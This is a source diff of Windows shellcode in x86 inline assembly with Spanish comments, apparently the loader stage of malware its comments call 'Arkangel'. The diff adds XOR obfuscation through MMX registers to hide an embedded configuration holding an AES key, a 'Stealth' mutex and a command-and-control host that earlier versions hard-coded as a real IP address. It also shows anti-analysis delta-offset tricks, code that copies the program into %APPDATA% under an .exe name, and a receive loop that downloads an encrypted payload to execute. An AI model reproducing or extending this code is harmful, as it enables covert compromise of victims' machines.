@@ -9,6 +9,8 @@
 //No queremos que muestre el warning de etiqueta sin referencia, 
 //ya que las usamos para mejorar la legibilidad del código
 #pragma warning(disable:4102)
+//No queremos el warning de EMMS, sabemos que estamos haciendo.
+#pragma warning(disable: 4799)
 
 #include <Windows.h>
 #include "macros.h"
@@ -17,26 +19,31 @@ void LoadFunctions(DWORD numHashes);
 
 void __declspec(naked) main(){
     __asm{
-#ifdef SC_DELTA
         /*###############################################################################
         ** Obtención del Delta offset:
         **    Obtenemos la posición relativa de nuestro código.
         **    Utilizamos un código poco común que utiliza la FPU.
-        **    Primero utilizamos 'fldpi' para actualizar el entorno de FPU
+        **    Primero utilizamos 'fldXX' para actualizar el entorno de FPU
         **    rellenando el item 'FPUInstructionPointer' de la estructura
-        **    con la dirección de la última instrucción FPU ('fldz')
+        **    con la dirección de la última instrucción FPU
         **    Por último cargamos la estructura de entorno con ('fstenv') 
         **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
         **    NOTAS{
         **        1: Se harcodean los opcodes para evitar tanto la comprobación
         **        de errores de FP como para evitar el byte superfluo que añade
         **        el visualC
-        **        2: La instrucción 'fldpi' en realidad hace un push PI en el stack FPU
-        **        (Quién analice el código no sabrá que coño pasa jajaja)
         **    }
         *###############################################################################*/
 find_delta:
-        fldpi
+        /* Hay que cargar una constante que no genere ceros en la configuración
+        D9EB           FLDPI        MM7-> B172 17F7 D1CF 79AC
+        D9E9           FLDL2T       MM7-> 9A20 9A84 FBCF F799
+        D9EA           FLDL2E       MM7-> B8AA 3B29 5C17 F0BC
+        D9EC           FLDLG2       MM7-> D49A 784B CD1B 8AFE
+        D9ED           FLDLN2       MM7-> C90F DAA2 2168 C235
+        */
+        fldln2
+#ifdef SC_DELTA
         EMIT_BYTE_ARRAY(
             (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
         )
@@ -115,18 +122,24 @@ over_hashes:
 config_start:
 KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
-                /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
-                /*bVersion*/    EMIT_BYTE(CUR_BLOB_VERSION)
-                /*wReserved*/   EMIT_WORD(0)
-                /*aiKeyAlg*/    EMIT_DWORD(CALG_AES_128)
+                /*bType*/       //EMIT_BYTE(PLAINTEXTKEYBLOB)
+                /*bVersion*/    //EMIT_BYTE(CUR_BLOB_VERSION)
+                /*wReserved*/   //EMIT_WORD(0)
+                /*aiKeyAlg*/    //EMIT_DWORD(CALG_AES_128)
             //}
-            /*keySize*/         EMIT_DWORD(0x10)
-            /*keydata[16]*/     EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
+            /*keySize*/         //EMIT_DWORD(0x10)
+            /*keydata[16]*/     //EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
             //SHA1("karcrack:1234")
         //}
-MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
+MUTEX:  //EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
 HOST:   //EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
-        EMIT_BYTE_ARRAY(('2') ('1') ('3') ('.') ('6') ('0') ('.') ('1') ('4') ('4') ('.') ('1') ('7') ('7')(0)) //213.60.144.177
+        //PADDING
+        //EMIT_DWORD(0)
+        //EMIT_DWORD(0)
+        EMIT_BYTE_ARRAY((0x9C) (0x57) (0xFF) (0xFF) (0xC6) (0x17) (0x72) (0xB1) (0xC0) (0x0D) (0xA7) (0xD1) (0xC6) (0x25) (0x45) (0x9F) (0xF5) (0x95) (0xF7) (0xD5) (0xA4) (0x63) (0x17) (0xD0) (0x77) (0xAF) (0xFC) (0xE0) (0x04) (0x97) (0xAB) (0xC4) (0xBC) (0x79) (0xCF) (0xD1) (0x94) (0x1F) (0x29) (0xD7) (0xA4) (0x7B) (0xCF) (0xD1) (0xF9) (0x71) (0x72) (0xB1))
+
+#define CONFIG_SIZE 52
+#define PACKET_CONFIG_COUNT CONFIG_SIZE/8
 config_end:
 #pragma endregion
     __asm{
@@ -192,7 +205,8 @@ start:
         push edi                        //Guardamos el Delta
         mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
         mov  edi, [eax+0x48]            //EDI = Environment
-        mov  eax, 0x003D0041            //EAX = "A\0=\0"
+        pushc(0x003D0041)               //v
+        pop eax                         //>EAX = "A\0=\0"
 redo:
         dec edi                         //v
         dec edi                         //> EDI-=2
@@ -251,23 +265,32 @@ find_kernel32_finished:
         //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4
 
+        //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
 
-        //ARREGLAR
-        //movr(esi, config_start)
-        //mov  eax, 0x7F
-        //call CreateBuff
+        movr(esi, config_start)         //Cargamos la posición del inicio de la config
+        push CONFIG_SIZE                //v
+        pop  eax                        //>EAX = CONFIG_SIZE
+        call CreateBuff                 //>CreateBuff(CONFIG_SIZE);
+        mov  edx, eax                   //EDX = &Buffer
 
-        movr(eax, KEY)
+#pragma region DECRYPT_CONFIG
+        push PACKET_CONFIG_COUNT        //v
+        pop  ecx                        //>ECX = Cantidad de bloques de 8 en config
+xornext:
+        lea  ebx, [esi+(ecx*8)-8]
+        movq mm0, QWORD PTR[ebx]
+        pxor mm0, mm7
+        movq QWORD PTR[edx], mm0
+        add  edx, 8
+        loop xornext
+#pragma endregion
 
+        //Guardamos los punteros a los valores descifrados
         mov  [ebp+_pKEY], eax
         lea  ebx, [eax+0x1C]
         mov  [ebp+_pMUTEX], ebx
         add  ebx, 0x8
         mov  [ebp+_pHOST], ebx
-
-#pragma region DECRYPT_DATA
-
-#pragma endregion
 
         cdq                             //EDX = 0
         push [ebp+_pMUTEX]              //v
@@ -288,19 +311,23 @@ find_kernel32_finished:
 nomtx:
 #endif //ERR_CHECK
 
+/*
+
+#pragma region MELT
         push 0x7F                       //v
         pop  eax                        //>EAX = 7F
         call CreateBuff                 //Creamos Buffer para la ruta
         mov  edi, eax                   //EDI = EAX
         mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
 
-copy_again:                             //Copiamos %APPDATA% en el buffer
-        lodsb
-        test al, al
-        jz copy_done
-        stosb
-        inc esi
-        jmp copy_again
+        //Copiamos %APPDATA% en el buffer
+copy_next:
+        lodsb                           //Cargamos byte
+        test al, al                     //¿Es cero?
+        jz copy_done                    //Si lo es hemos acabado...
+        stosb                           //Guardamos el byte
+        inc esi                         //Saltamos el byte Nulo
+        jmp copy_next                   //Siguiente carácter
 copy_done:
         //Añadimos a %APPDATA% un nombre al azar.
         cdq                             //EDX = 0
@@ -309,8 +336,11 @@ copy_done:
         push edx                        //v
         push edi                        //v
         call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
-        //Reemplazamos la extensión a ".exe"
-        mov  DWORD PTR[edi+5],'exe.'
+        mov  DWORD PTR[edi+5],'exe.'    //Reemplazamos la extensión a ".exe"
+
+#pragma endregion
+
+*/
 
 #define BUFF_SIZE 0x5000
 _cont:  xor  eax, eax                   //EAX = 0
@@ -400,14 +430,14 @@ connected:
         **      *IV(16bytes)    : Vector de inicialización para el cifrado
         **{{
         **      *checksum       : checksum de todo el payload, para evitar error crítico al ejecutar.
-        **      *LOADER_IAT     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
+        **      *LOADER     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
         **}}
-        **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(user+pass)
+        **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(pass)
         *###############################################################################*/
 recibir:
         cdq                             //EDX = 0
         push edx                        //v
-        push BUFF_SIZE                  //v
+        pushc(BUFF_SIZE)                //v
         push [ebp+_pBuff]               //v
         push [ebp+_hSocket]             //v
         call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
